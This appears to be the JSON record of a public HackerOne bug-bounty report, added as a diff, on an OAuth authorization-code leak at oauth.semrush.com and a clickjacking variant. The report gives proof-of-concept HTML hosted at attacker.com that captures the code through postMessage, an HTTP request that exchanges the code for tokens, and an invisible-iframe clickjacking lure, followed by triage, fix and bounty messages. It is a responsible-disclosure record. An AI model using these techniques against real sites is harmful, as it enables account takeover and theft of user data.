@@ -1,0 +1,514 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-03-20T14:44:51.228Z", 
+    "voters": [
+        "jokebookservice1", 
+        "secator", 
+        "spam404", 
+        "hunter", 
+        "emitrani", 
+        "bagipro", 
+        "inhibitor181", 
+        "akaash_pantherdefence", 
+        "muon4", 
+        "asad0x01_", 
+        "and 30 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "650.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 314814, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-04-17T11:58:56.440Z", 
+    "vulnerability_information": "Domain, site, application\n---\noauth.semrush.com\n\nSteps to reproduce\n---\n1) Create following html at attacker.com/postmessage.html\n\n```\n<script>\n  function listener(event) {\n    alert(JSON.stringify(event.data));\n  }\n\n  var dest = window.open(\"https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess&state=636e7bae-22ed-407d-8d62-1d49b49ec962\");\n  \n  window.addEventListener(\"message\", listener);\n</script>\n```\n2) Go to attacker.com/postmessage.html (make sure you are logged in at www.semrush.com)\n3) Click \"Approve\"\n4) Go to tab with attacker.com, you will see alert with `code`\n5) Make POST request with obtained `code`\n```\nPOST /oauth2/access_token HTTP/1.1\nHost: oauth.semrush.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: */*\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-type: application/x-www-form-urlencoded\nContent-Length: 205\nDNT: 1\nConnection: close\n\nclient_id=seoquake&client_secret=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&grant_type=authorization_code&code=[COPY OBTAINED CODE HERE]&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess\n```\n6) Receive response with `access token` and `refresh token`\n```\nHTTP/1.1 200 OK\nServer: nginx\nContent-Type: application/json\nConnection: close\nCache-Control: no-cache\nDate: Sat, 10 Feb 2018 19:06:38 GMT\nSet-Cookie: session=\u2588\u2588\u2588\u2588; expires=Sat, 10-Feb-2018 21:06:38 GMT; Max-Age=7200; path=/; httponly\n\n{\"access_token\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\"token_type\":\"Bearer\",\"expires_in\":604800,\"refresh_token\":\"kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC\"}\n```\n\nActual results\n---\n`access token` and `refresh token` of victim:\n```\n{\"access_token\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\"token_type\":\"Bearer\",\"expires_in\":604800,\"refresh_token\":\"kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC\"}\n```\n\nPoC, exploit code, screenshots, video, references, additional resources\n---\nThis vulnerability is possible due to lack of `window.opener` origin check at `https://oauth.semrush.com/oauth2/success`:\n```\n<script>\n\tif (window.opener && typeof opener.postMessage === 'function') {\n\t\topener.postMessage({ type: 'semrush:oauth:success', url: location.href }, '*');\n\t}\n</script>\n```\nMeaning any site that opens `https://oauth.semrush.com/oauth2/success` may read `code` in `location.href`.\n\nAttack vector based on fact that user sees SEOquake authorization page F262215 thinking that it's just official application permission request and with high probability clicks \"Approve\".\n\nStill working at vector without this small user interaction.\n\n## Impact\n\nOAuth tokens leakage. This leads to user sensitive information leakage.\n**Note**: it's not necessary to install SEOquake plugin!\n\nP.S.\n---\nI'm aware of user info leakage, project info leakage and Site Audit info leakage but maybe there is wider scope of possible sensitive info leak.\n\nI've reported vulnerability as soon as possible therefore no time to deeper scope research.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "none", 
+            "user_interaction": "required", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "changed", 
+            "integrity": "none", 
+            "availability": "none"
+        }, 
+        "rating": "high", 
+        "score": 7.4, 
+        "author_type": "User"
+    }, 
+    "title": "[oauth token leak] at oauth.semrush.com", 
+    "is_member_of_team?": null, 
+    "vote_count": 40, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2018-04-19T14:44:51.341Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$650", 
+    "attachments": [
+        {
+            "file_name": "approve.png", 
+            "type": "image/png", 
+            "id": 262215, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/262/215/861594939f6e5cb9672825c39922437bb3c1ee1d/approve.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3e98be2c19fe44823953f46bab75fcb3e155136a3c958ccb217d2fda5e488f74"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/262/227/307c340c9670bea51a1f9060fe5850a5b0fdec53/attacker.com.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=21515b776504d9a2211c33f9f0092dc32181a9cdcd8bfb07531b599da9f97a40", 
+                    "type": "image/png", 
+                    "id": 262227, 
+                    "filename": "attacker.com.png"
+                }, 
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/262/226/ad997d9bd326fe6085b0e3fce38f0efd8511b5eb/attacker.com_after_click.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b9d586db2bbc2c7c146d9f00702a907073530f4b36fac637d7417fbd98d3d971", 
+                    "type": "image/png", 
+                    "id": 262226, 
+                    "filename": "attacker.com_after_click.png"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2018-02-10T20:36:26.244Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-10T20:36:26.244Z", 
+            "actor": {
+                "username": "nikitastupin", 
+                "url": "/nikitastupin", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/131/023/6f27b762282778516eff187e3fcf88f2648648fd_medium.jpg?1491807864"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "I've written new exploit which increases a probability of victim to click (note: that exploit uses fact that there is no `X-Frame-Options` header at `oauth.semrush.com`:\n```\n<button style=\"position:absolute;bottom:140px;right:530px;height:30px;width:70px;background-color:red\" frameBorder=\"0\">Get $1000!</button>\n<iframe name=\"theFrame\" style=\"width:100%;height:100%;opacity:0;overflow: hidden;\"></iframe>\n<script>\n\n  function listener(event) {\n    alert(JSON.stringify(event.data));\n  }\n\n  var dest = window.open(\"https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess&state=636e7bae-22ed-407d-8d62-1d49b49ec962\", \"theFrame\");\n  \n  window.addEventListener(\"message\", listener);\n  console.log(window.elementFromPoint(869, 656));\n</script>\n```\n1) Victim goes to `attacker.com/postmessage.html` and sees  F262227\n2) Victim clicks on button to get $1000 but in fact clicks on \"Approve\"\n3) Attacker gets `code`  F262226", 
+            "markdown_message": "<p>I&#39;ve written new exploit which increases a probability of victim to click (note: that exploit uses fact that there is no <code>X-Frame-Options</code> header at <code>oauth.semrush.com</code>:</p>\n<pre class=\"highlight plaintext\"><code>&lt;button style=&quot;position:absolute;bottom:140px;right:530px;height:30px;width:70px;background-color:red&quot; frameBorder=&quot;0&quot;&gt;Get $1000!&lt;/button&gt;\n&lt;iframe name=&quot;theFrame&quot; style=&quot;width:100%;height:100%;opacity:0;overflow: hidden;&quot;&gt;&lt;/iframe&gt;\n&lt;script&gt;\n\n  function listener(event) {\n    alert(JSON.stringify(event.data));\n  }\n\n  var dest = window.open(&quot;https://oauth.semrush.com/oauth2/authorize?response_type=code&amp;scope=user.info,projects.info,siteaudit.info&amp;client_id=seoquake&amp;redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess&amp;state=636e7bae-22ed-407d-8d62-1d49b49ec962&quot;, &quot;theFrame&quot;);\n\n  window.addEventListener(&quot;message&quot;, listener);\n  console.log(window.elementFromPoint(869, 656));\n&lt;/script&gt;\n</code></pre>\n<p>1) Victim goes to <code>attacker.com/postmessage.html</code> and sees  <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"attacker.com.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/262/227/307c340c9670bea51a1f9060fe5850a5b0fdec53/attacker.com.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=21515b776504d9a2211c33f9f0092dc32181a9cdcd8bfb07531b599da9f97a40\" data-attachment-type=\"image/png\">attacker.com.png (F262227)</a><br>\n2) Victim clicks on button to get $1000 but in fact clicks on &quot;Approve&quot;<br>\n3) Attacker gets <code>code</code>  <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"attacker.com_after_click.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/262/226/ad997d9bd326fe6085b0e3fce38f0efd8511b5eb/attacker.com_after_click.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=b9d586db2bbc2c7c146d9f00702a907073530f4b36fac637d7417fbd98d3d971\" data-attachment-type=\"image/png\">attacker.com_after_click.png (F262226)</a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2371270, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-12T13:44:25.283Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-12T13:44:25.283Z", 
+            "actor": {
+                "username": "alla", 
+                "url": "/alla", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "Thanks for the report, we will investigate this.", 
+            "markdown_message": "<p>Thanks for the report, we will investigate this.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2375048, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-12T16:35:02.109Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-12T16:35:02.109Z", 
+            "actor": {
+                "username": "alla", 
+                "url": "/alla", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 2375626, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-21T16:46:02.232Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-21T16:46:02.232Z", 
+            "actor": {
+                "username": "nikitastupin", 
+                "url": "/nikitastupin", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/131/023/6f27b762282778516eff187e3fcf88f2648648fd_medium.jpg?1491807864"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "Any updates?", 
+            "markdown_message": "<p>Any updates?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2412022, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-22T10:59:22.046Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-22T10:59:22.046Z", 
+            "actor": {
+                "username": "alla", 
+                "url": "/alla", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "We'll inform you about any updates. Thank you for your patience.", 
+            "markdown_message": "<p>We&#39;ll inform you about any updates. Thank you for your patience.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2415219, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-02-28T13:18:47.530Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-28T13:18:47.530Z", 
+            "actor": {
+                "url": "/semrush", 
+                "profile": {
+                    "name": "SEMrush"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/966/9b01ecc388e5d9d64b3b532dd5db41b02323e9dc_medium.png?1477497046"
+                }
+            }, 
+            "team_handle": "semrush", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "500.0", 
+            "collaborator": {
+                "username": "nikitastupin", 
+                "url": "/nikitastupin"
+            }, 
+            "message": "Thanks for making our service safer!", 
+            "markdown_message": "<p>Thanks for making our service safer!</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2442742, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-28T13:46:58.613Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-28T13:46:58.613Z", 
+            "actor": {
+                "username": "nikitastupin", 
+                "url": "/nikitastupin", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/131/023/6f27b762282778516eff187e3fcf88f2648648fd_medium.jpg?1491807864"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "Hi,\nThanks for bounty! Looking for more vulnerabilities!\n\nIs this bounty for oauth token leak only or for oauth token leak plus clickjacking?", 
+            "markdown_message": "<p>Hi,<br>\nThanks for bounty! Looking for more vulnerabilities!</p>\n\n<p>Is this bounty for oauth token leak only or for oauth token leak plus clickjacking?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2442791, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-17T21:29:01.238Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-17T21:29:01.238Z", 
+            "actor": {
+                "username": "alla", 
+                "url": "/alla", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "Could you please check the fix?", 
+            "markdown_message": "<p>Could you please check the fix?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2502259, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-18T09:08:41.205Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-18T09:08:41.205Z", 
+            "actor": {
+                "username": "nikitastupin", 
+                "url": "/nikitastupin", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/131/023/6f27b762282778516eff187e3fcf88f2648648fd_medium.jpg?1491807864"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "It's fixed.\n\nWhat about my question above?", 
+            "markdown_message": "<p>It&#39;s fixed.</p>\n\n<p>What about my question above?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2503201, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "nikitastupin", 
+                "url": "/nikitastupin"
+            }, 
+            "created_at": "2018-03-18T14:07:20.398Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-18T14:07:20.398Z", 
+            "actor": {
+                "username": "alla", 
+                "url": "/alla", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 2503535, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-18T14:08:13.363Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-18T14:08:13.363Z", 
+            "actor": {
+                "username": "alla", 
+                "url": "/alla", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "We'll answer very soon. Thank you for your patience.", 
+            "markdown_message": "<p>We&#39;ll answer very soon. Thank you for your patience.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2503537, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-03-20T13:11:10.553Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-20T13:11:10.553Z", 
+            "actor": {
+                "url": "/semrush", 
+                "profile": {
+                    "name": "SEMrush"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/966/9b01ecc388e5d9d64b3b532dd5db41b02323e9dc_medium.png?1477497046"
+                }
+            }, 
+            "team_handle": "semrush", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "150.0", 
+            "collaborator": {
+                "username": "nikitastupin", 
+                "url": "/nikitastupin"
+            }, 
+            "message": "This was only for oauth token leak and now +150 for clickjacking. Have a nice day Nikita)", 
+            "markdown_message": "<p>This was only for oauth token leak and now +150 for clickjacking. Have a nice day Nikita)</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2510239, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-20T14:44:51.265Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-20T14:44:51.265Z", 
+            "actor": {
+                "username": "nikitastupin", 
+                "url": "/nikitastupin", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/131/023/6f27b762282778516eff187e3fcf88f2648648fd_medium.jpg?1491807864"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "first_to_agree": true, 
+            "message": "Thanks for another bounty!\n\nDon't you mind to disclose this one?", 
+            "markdown_message": "<p>Thanks for another bounty!</p>\n\n<p>Don&#39;t you mind to disclose this one?</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2510575, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-17T11:58:56.468Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-17T11:58:56.468Z", 
+            "actor": {
+                "username": "security_semrush", 
+                "url": "/security_semrush", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/119/730/37407ab14fa44535e830b43832da386f2a6d2e3a_medium.png?1477497134"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2624182, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-17T11:58:56.608Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-17T11:58:56.608Z", 
+            "actor": {
+                "username": "security_semrush", 
+                "url": "/security_semrush", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/119/730/37407ab14fa44535e830b43832da386f2a6d2e3a_medium.png?1477497134"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2624183, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
